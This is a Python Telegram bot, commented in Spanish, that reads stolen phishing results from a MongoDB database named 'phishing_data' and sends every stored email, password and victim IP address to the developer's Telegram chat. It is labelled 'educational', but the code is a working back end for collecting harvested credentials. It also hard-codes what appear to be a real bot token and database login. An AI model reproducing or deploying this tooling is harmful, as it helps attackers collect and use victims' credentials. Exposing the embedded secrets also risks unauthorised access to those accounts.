import telebot
from pymongo import MongoClient
from datetime import datetime

# Tu token de Telegram
TOKEN = '5734262971:AAEqDb0ofuhSP_ylcd5XBxTmKWdyEAypjoU'

# ID de chat del desarrollador
DEVELOPER_CHAT_ID = 5325631223

# Conectar a MongoDB Atlas
uri = "mongodb://CHICO_SP:CHICO_CP@videojuego-shard-00-00.q8k6p.mongodb.net:27017/?ssl=true&authSource=admin&retryWrites=true&w=majority"
client = MongoClient(uri)
db = client.phishing_data
collection = db.user_credentials

# Inicializar el bot
bot = telebot.TeleBot(TOKEN)

# Función que formatea los resultados
def format_results(results):
    if not results:
        return "🔍 No se encontraron resultados en la base de datos."
    
    formatted_message = "📝 **Resultados Recolectados**:\n"
    for idx, result in enumerate(results, start=1):
        email = result.get('email', 'No disponible')
        password = result.get('password', 'No disponible')
        ip = result.get('ip', 'No disponible')
#        date = result.get('date', datetime.now()).strftime("%Y-%m-%d %H:%M:%S")
        
        formatted_message += f"\n\n🔑 **Entrada {idx}**:\n"
        formatted_message += f"💌 **Correo**: {email}\n"
        formatted_message += f"🔐 **Contraseña**: {password}\n"
        formatted_message += f"🌐 **IP**: {ip}\n"
#        formatted_message += f"🕒 **Fecha**: {date}\n"
    
    return formatted_message

# Comando para iniciar el bot
@bot.message_handler(commands=['start'])
def start(message):
    welcome_message = (
        "👋 ¡Hola! Soy un bot educativo de **Phishing**.\n\n"
        "Mi función es mostrarte cómo **simular** la recolección de información de manera segura y solo con fines educativos.\n\n"
        "⚠️ **No uses este script con fines maliciosos**. El propósito es aprender y mejorar la seguridad.\n\n"
        "💻 **Desarrollador**: @Gh0stDeveloper\n"
        "Si tienes alguna pregunta o sugerencia, no dudes en contactarme.\n"
        "🚫 **Este bot es solo para fines educativos y no debe ser utilizado para actividades ilegales.**"
    )
    bot.send_message(message.chat.id, welcome_message, parse_mode="Markdown")

# Comando para enviar los resultados
@bot.message_handler(commands=['get_results'])
def send_results(message):
    if message.chat.id != DEVELOPER_CHAT_ID:
        bot.send_message(message.chat.id, "⚠️ Solo el desarrollador puede usar este comando.")
        return
    
    # Buscar todos los documentos en MongoDB
    results = collection.find()
    
    # Formatear los resultados
    message_text = format_results(results)
    
    # Enviar mensaje con los resultados
    bot.send_message(message.chat.id, message_text, parse_mode= "Markdown")

# Iniciar el bot
bot.polling()